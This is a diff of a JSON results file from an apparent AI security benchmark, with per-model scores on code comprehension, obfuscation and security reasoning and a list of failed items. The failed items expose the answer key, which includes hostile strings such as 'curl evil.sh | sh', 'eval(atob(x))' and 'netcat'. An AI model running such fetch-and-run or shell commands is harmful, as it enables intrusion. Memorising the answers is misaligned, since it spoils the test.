@@ -1,6 +1,6 @@
 {
  "agg": {
-  "GLM-5.1": {
+  "GLM-5.1 (FPT AI)": {
    "code_comprehension": 1.0,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -8,7 +8,15 @@
    "obfuscation_hard": 0.8888888888888888,
    "security_reasoning_hard": 0.9
   },
-  "Qwen3.6-27B": {
+  "GLM-5.1 (Opencode Go)": {
+   "code_comprehension": 0.75,
+   "obfuscation": 1.0,
+   "security_reasoning": 1.0,
+   "code_comprehension_hard": 1.0,
+   "obfuscation_hard": 0.8888888888888888,
+   "security_reasoning_hard": 0.9
+  },
+  "Qwen3.6-27B (FPT AI)": {
    "code_comprehension": 1.0,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -16,15 +24,7 @@
    "obfuscation_hard": 0.8888888888888888,
    "security_reasoning_hard": 0.9
   },
-  "claude-opus-4-6": {
-   "code_comprehension": null,
-   "obfuscation": null,
-   "security_reasoning": null,
-   "code_comprehension_hard": null,
-   "obfuscation_hard": null,
-   "security_reasoning_hard": null
-  },
-  "claude-opus-4-7": {
+  "claude-opus-4-7 (Opencode Zen)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -32,7 +32,7 @@
    "obfuscation_hard": 0.5555555555555556,
    "security_reasoning_hard": 0.9
   },
-  "claude-opus-4-8": {
+  "claude-opus-4-8 (Opencode Zen)": {
    "code_comprehension": 0.25,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -40,7 +40,7 @@
    "obfuscation_hard": 0.6666666666666666,
    "security_reasoning_hard": 1.0
   },
-  "deepseek-v4-flash": {
+  "deepseek-v4-flash (Opencode Go)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 0.75,
@@ -48,7 +48,7 @@
    "obfuscation_hard": 0.6666666666666666,
    "security_reasoning_hard": 0.8
   },
-  "deepseek-v4-pro": {
+  "deepseek-v4-pro (Opencode Go)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -56,15 +56,7 @@
    "obfuscation_hard": 0.8888888888888888,
    "security_reasoning_hard": 0.9
   },
-  "glm-5.1": {
-   "code_comprehension": 0.75,
-   "obfuscation": 1.0,
-   "security_reasoning": 1.0,
-   "code_comprehension_hard": 1.0,
-   "obfuscation_hard": 0.8888888888888888,
-   "security_reasoning_hard": 0.9
-  },
-  "gpt-5.3-codex": {
+  "gpt-5.3-codex (Opencode Zen)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 0.75,
@@ -72,7 +64,7 @@
    "obfuscation_hard": 1.0,
    "security_reasoning_hard": 0.8
   },
-  "gpt-5.4": {
+  "gpt-5.4 (Opencode Zen)": {
    "code_comprehension": 0.5,
    "obfuscation": 1.0,
    "security_reasoning": 0.75,
@@ -80,7 +72,7 @@
    "obfuscation_hard": 0.8888888888888888,
    "security_reasoning_hard": 0.8
   },
-  "gpt-5.5": {
+  "gpt-5.5 (Opencode Zen)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 0.75,
@@ -88,7 +80,7 @@
    "obfuscation_hard": 1.0,
    "security_reasoning_hard": 0.8
   },
-  "kimi-k2.6": {
+  "kimi-k2.6 (Opencode Go)": {
    "code_comprehension": 0.5,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -96,7 +88,7 @@
    "obfuscation_hard": 1.0,
    "security_reasoning_hard": 1.0
   },
-  "qwen3.6-plus": {
+  "qwen3.6-plus (Opencode Go)": {
    "code_comprehension": 1.0,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -104,7 +96,7 @@
    "obfuscation_hard": 0.8888888888888888,
    "security_reasoning_hard": 1.0
   },
-  "qwen3.7-max": {
+  "qwen3.7-max (Opencode Go)": {
    "code_comprehension": 0.75,
    "obfuscation": 1.0,
    "security_reasoning": 1.0,
@@ -114,294 +106,138 @@
   }
  },
  "extra": {
-  "GLM-5.1": {
+  "GLM-5.1 (FPT AI)": {
    "easy": 1.0,
    "hard": 0.9296296296296296,
    "mean_out": 3699,
+   "mean_rsn": 0,
+   "provider": "FPT AI",
    "status": "ok"
   },
-  "Qwen3.6-27B": {
+  "GLM-5.1 (Opencode Go)": {
+   "easy": 0.9166666666666666,
+   "hard": 0.9296296296296296,
+   "mean_out": 6334,
+   "mean_rsn": 0,
+   "provider": "Opencode Go",
+   "status": "ok"
+  },
+  "Qwen3.6-27B (FPT AI)": {
    "easy": 1.0,
    "hard": 0.887962962962963,
    "mean_out": 9356,
+   "mean_rsn": 0,
+   "provider": "FPT AI",
    "status": "ok"
   },
-  "claude-opus-4-6": {
-   "easy": null,
-   "hard": null,
-   "mean_out": 0,
-   "status": "FAILED"
-  },
-  "claude-opus-4-7": {
+  "claude-opus-4-7 (Opencode Zen)": {
    "easy": 0.9166666666666666,
    "hard": 0.8185185185185185,
-   "mean_out": 566.6666666666666,
+   "mean_out": 567,
+   "mean_rsn": 0,
+   "provider": "Opencode Zen",
    "status": "ok"
   },
-  "claude-opus-4-8": {
+  "claude-opus-4-8 (Opencode Zen)": {
    "easy": 0.75,
    "hard": 0.8888888888888888,
-   "mean_out": 1289.3333333333333,
+   "mean_out": 1289,
+   "mean_rsn": 0,
+   "provider": "Opencode Zen",
    "status": "ok"
   },
-  "deepseek-v4-flash": {
+  "deepseek-v4-flash (Opencode Go)": {
    "easy": 0.8333333333333334,
    "hard": 0.8222222222222223,
-   "mean_out": 9197.333333333334,
+   "mean_out": 9197,
+   "mean_rsn": 8918,
+   "provider": "Opencode Go",
    "status": "ok"
   },
-  "deepseek-v4-pro": {
+  "deepseek-v4-pro (Opencode Go)": {
    "easy": 0.9166666666666666,
    "hard": 0.9296296296296296,
-   "mean_out": 7851.166666666667,
+   "mean_out": 7851,
+   "mean_rsn": 7586,
+   "provider": "Opencode Go",
    "status": "ok"
   },
-  "glm-5.1": {
-   "easy": 0.9166666666666666,
-   "hard": 0.9296296296296296,
-   "mean_out": 6334.166666666667,
-   "status": "ok"
-  },
-  "gpt-5.3-codex": {
+  "gpt-5.3-codex (Opencode Zen)": {
    "easy": 0.8333333333333334,
    "hard": 0.9333333333333332,
-   "mean_out": 976.1666666666666,
+   "mean_out": 976,
+   "mean_rsn": 0,
+   "provider": "Opencode Zen",
    "status": "ok"
   },
-  "gpt-5.4": {
+  "gpt-5.4 (Opencode Zen)": {
    "easy": 0.75,
    "hard": 0.8962962962962964,
-   "mean_out": 1179.6666666666667,
+   "mean_out": 1180,
+   "mean_rsn": 0,
+   "provider": "Opencode Zen",
    "status": "ok"
   },
-  "gpt-5.5": {
+  "gpt-5.5 (Opencode Zen)": {
    "easy": 0.8333333333333334,
    "hard": 0.9333333333333332,
-   "mean_out": 1139.3333333333333,
+   "mean_out": 1139,
+   "mean_rsn": 0,
+   "provider": "Opencode Zen",
    "status": "ok"
   },
-  "kimi-k2.6": {
+  "kimi-k2.6 (Opencode Go)": {
    "easy": 0.8333333333333334,
    "hard": 1.0,
-   "mean_out": 7368.166666666667,
+   "mean_out": 7368,
+   "mean_rsn": 0,
+   "provider": "Opencode Go",
    "status": "ok"
   },
-  "qwen3.6-plus": {
+  "qwen3.6-plus (Opencode Go)": {
    "easy": 1.0,
    "hard": 0.9629629629629629,
-   "mean_out": 8116.166666666667,
+   "mean_out": 8116,
+   "mean_rsn": 7648,
+   "provider": "Opencode Go",
    "status": "ok"
   },
-  "qwen3.7-max": {
+  "qwen3.7-max (Opencode Go)": {
    "easy": 0.9166666666666666,
    "hard": 1.0,
-   "mean_out": 8263.666666666666,
+   "mean_out": 8264,
+   "mean_rsn": 5038,
+   "provider": "Opencode Go",
    "status": "ok"
   }
  },
  "fails": [
   [
-   "qwen3.6-plus",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
-   "I",
-   ""
-  ],
-  [
-   "GLM-5.1",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
-   "I",
-   ""
-  ],
-  [
-   "deepseek-v4-pro",
+   "gpt-5.5 (Opencode Zen)",
    "security_reasoning_hard",
    "srh-004",
    "safe",
-   "N",
-   ""
-  ],
-  [
-   "deepseek-v4-pro",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
    "I",
-   ""
+   "The path normalization and `os.path.commonpath()` check correctly blocks simple `../` trav"
   ],
   [
-   "glm-5.1",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
-   "I",
-   ""
-  ],
-  [
-   "deepseek-v4-flash",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "N",
-   ""
-  ],
-  [
-   "deepseek-v4-flash",
+   "gpt-5.5 (Opencode Zen)",
    "security_reasoning_hard",
    "srh-008",
    "safe",
    "I",
-   "The code uses `subprocess.run` with `shell=False` and a list of arguments, which"
+   "Using `subprocess.run()` with a list of arguments and `shell=False` prevents shell metacha"
   ],
   [
-   "deepseek-v4-flash",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
-   "I",
-   ""
-  ],
-  [
-   "deepseek-v4-flash",
-   "obfuscation_hard",
-   "obh-002",
-   "whoami",
-   "I",
-   ""
-  ],
-  [
-   "deepseek-v4-flash",
-   "obfuscation_hard",
-   "obh-009",
-   "passwd",
-   "I",
-   "password"
-  ],
-  [
-   "Qwen3.6-27B",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "I",
-   "The code implements a common defense against directory traversal by resolving th"
-  ],
-  [
-   "Qwen3.6-27B",
-   "obfuscation_hard",
-   "obh-001",
-   "eval(atob(x))",
-   "I",
-   ""
-  ],
-  [
-   "glm-5.1",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "N",
-   ""
-  ],
-  [
-   "GLM-5.1",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "I",
-   "The code attempts to prevent path traversal (directory escape) by resolving syml"
-  ],
-  [
-   "deepseek-v4-flash",
+   "gpt-5.5 (Opencode Zen)",
    "security_reasoning",
    "sr-004",
    "safe",
    "I",
-   "The code uses `subprocess.run` with a list, which avoids shell injection because"
+   "Using a list with `subprocess.run(..., shell=False)` prevents classic shell injection like"
   ],
   [
-   "Qwen3.6-27B",
-   "code_comprehension_hard",
-   "cch-001",
-   "object",
-   "I",
-   ""
-  ],
-  [
-   "qwen3.7-max",
-   "code_comprehension",
-   "cc-004",
-   "yes",
-   "I",
-   "No"
-  ],
-  [
-   "glm-5.1",
-   "code_comprehension",
-   "cc-004",
-   "yes",
-   "I",
-   "No"
-  ],
-  [
-   "deepseek-v4-flash",
-   "code_comprehension",
-   "cc-004",
-   "yes",
-   "I",
-   "no"
-  ],
-  [
-   "kimi-k2.6",
-   "code_comprehension",
-   "cc-002",
-   "O(n^2)",
-   "I",
-   "O(n\u00b2)"
-  ],
-  [
-   "kimi-k2.6",
-   "code_comprehension",
-   "cc-004",
-   "yes",
-   "I",
-   "No"
-  ],
-  [
-   "deepseek-v4-pro",
-   "code_comprehension",
-   "cc-002",
-   "O(n^2)",
-   "I",
-   "O(n\u00b2)"
-  ],
-  [
-   "gpt-5.5",
-   "security_reasoning_hard",
-   "srh-004",
-   "safe",
-   "I",
-   "The path normalization and `os.path.commonpath()` check correctly blocks simple "
-  ],
-  [
-   "gpt-5.5",
-   "security_reasoning_hard",
-   "srh-008",
-   "safe",
-   "I",
-   "Using `subprocess.run()` with a list of arguments and `shell=False` prevents she"
-  ],
-  [
-   "gpt-5.5",
-   "security_reasoning",
-   "sr-004",
-   "safe",
-   "I",
-   "Using a list with `subprocess.run(..., shell=False)` prevents classic shell inje"
-  ],
-  [
-   "gpt-5.4",
+   "gpt-5.4 (Opencode Zen)",
    "obfuscation_hard",
    "obh-001",
    "eval(atob(x))",
@@ -409,39 +245,39 @@
    "I'm sorry, but I cannot assist with that request."
   ],
   [
-   "gpt-5.4",
+   "gpt-5.4 (Opencode Zen)",
    "security_reasoning_hard",
    "srh-004",
    "safe",
    "I",
-   "The path traversal check is **mostly correct against simple `../` and symlink es"
+   "The path traversal check is **mostly correct against simple `../` and symlink escapes**:"
   ],
   [
-   "gpt-5.4",
+   "gpt-5.4 (Opencode Zen)",
    "security_reasoning_hard",
    "srh-008",
    "safe",
    "I",
-   "Reasoning: `shell=False` with a list prevents classic shell-command injection, s"
+   "Reasoning: `shell=False` with a list prevents classic shell-command injection, so inputs l"
   ],
   [
-   "gpt-5.3-codex",
+   "gpt-5.3-codex (Opencode Zen)",
    "security_reasoning_hard",
    "srh-004",
    "safe",
    "I",
-   "It mitigates **basic `..` traversal** by using `realpath` + `commonpath`, but it"
+   "It mitigates **basic `..` traversal** by using `realpath` + `commonpath`, but it is still"
   ],
   [
-   "gpt-5.3-codex",
+   "gpt-5.3-codex (Opencode Zen)",
    "security_reasoning_hard",
    "srh-008",
    "safe",
    "I",
-   "This is **not vulnerable to shell command injection** in the usual sense, becaus"
+   "This is **not vulnerable to shell command injection** in the usual sense, because:  - `she"
   ],
   [
-   "claude-opus-4-8",
+   "claude-opus-4-8 (Opencode Zen)",
    "obfuscation_hard",
    "obh-001",
    "eval(atob(x))",
@@ -449,7 +285,7 @@
    ""
   ],
   [
-   "claude-opus-4-8",
+   "claude-opus-4-8 (Opencode Zen)",
    "obfuscation_hard",
    "obh-005",
    "curl evil.sh | sh",
@@ -457,7 +293,7 @@
    ""
   ],
   [
-   "claude-opus-4-8",
+   "claude-opus-4-8 (Opencode Zen)",
    "obfuscation_hard",
    "obh-008",
    "netcat",
@@ -465,31 +301,31 @@
    "noting"
   ],
   [
-   "gpt-5.3-codex",
+   "gpt-5.3-codex (Opencode Zen)",
    "code_comprehension",
    "cc-002",
    "O(n^2)",
    "I",
-   "The time complexity is **O(n\u00b2)**.  There are two nested loops, each running `n` "
+   "The time complexity is **O(n\u00b2)**.  There are two nested loops, each running `n` times, so"
   ],
   [
-   "claude-opus-4-7",
+   "claude-opus-4-7 (Opencode Zen)",
    "security_reasoning_hard",
    "srh-008",
    "safe",
    "I",
-   "The code uses `subprocess.run` with `shell=False` and passes arguments as a list"
+   "The code uses `subprocess.run` with `shell=False` and passes arguments as a list, which pr"
   ],
   [
-   "gpt-5.4",
+   "gpt-5.4 (Opencode Zen)",
    "security_reasoning",
    "sr-004",
    "safe",
    "I",
-   "Reasoning: `subprocess.run([...])` with a list and default `shell=False` is **no"
+   "Reasoning: `subprocess.run([...])` with a list and default `shell=False` is **not vulnerab"
   ],
   [
-   "claude-opus-4-7",
+   "claude-opus-4-7 (Opencode Zen)",
    "obfuscation_hard",
    "obh-001",
    "eval(atob(x))",
@@ -497,7 +333,7 @@
    ""
   ],
   [
-   "claude-opus-4-7",
+   "claude-opus-4-7 (Opencode Zen)",
    "obfuscation_hard",
    "obh-005",
    "curl evil.sh | sh",
@@ -505,7 +341,7 @@
    ""
   ],
   [
-   "claude-opus-4-7",
+   "claude-opus-4-7 (Opencode Zen)",
    "obfuscation_hard",
    "obh-007",
    "/bin/sh",
@@ -513,7 +349,7 @@
    "test"
   ],
   [
-   "claude-opus-4-7",
+   "claude-opus-4-7 (Opencode Zen)",
    "obfuscation_hard",
    "obh-008",
    "netcat",
@@ -521,7 +357,7 @@
    "nethic"
   ],
   [
-   "gpt-5.4",
+   "gpt-5.4 (Opencode Zen)",
    "code_comprehension",
    "cc-002",
    "O(n^2)",
@@ -529,7 +365,7 @@
    "O(n\u00b2)"
   ],
   [
-   "gpt-5.4",
+   "gpt-5.4 (Opencode Zen)",
    "code_comprehension",
    "cc-004",
    "yes",
@@ -537,7 +373,7 @@
    "No."
   ],
   [
-   "gpt-5.5",
+   "gpt-5.5 (Opencode Zen)",
    "code_comprehension",
    "cc-002",
    "O(n^2)",
@@ -545,15 +381,15 @@
    "O(n\u00b2)"
   ],
   [
-   "gpt-5.3-codex",
+   "gpt-5.3-codex (Opencode Zen)",
    "security_reasoning",
    "sr-004",
    "safe",
    "I",
-   "This is **not** vulnerable to classic shell-command injection, because `subproce"
+   "This is **not** vulnerable to classic shell-command injection, because `subprocess.run` is"
   ],
   [
-   "claude-opus-4-7",
+   "claude-opus-4-7 (Opencode Zen)",
    "code_comprehension",
    "cc-002",
    "O(n^2)",
@@ -561,7 +397,7 @@
    "O(n\u00b2)"
   ],
   [
-   "claude-opus-4-8",
+   "claude-opus-4-8 (Opencode Zen)",
    "code_comprehension",
    "cc-002",
    "O(n^2)",
@@ -569,7 +405,7 @@
    "O(n\u00b2)"
   ],
   [
-   "claude-opus-4-8",
+   "claude-opus-4-8 (Opencode Zen)",
    "code_comprehension",
    "cc-003",
    "2",
@@ -577,7 +413,7 @@
    "3"
   ],
   [
-   "claude-opus-4-8",
+   "claude-opus-4-8 (Opencode Zen)",
    "code_comprehension",
    "cc-004",
    "yes",
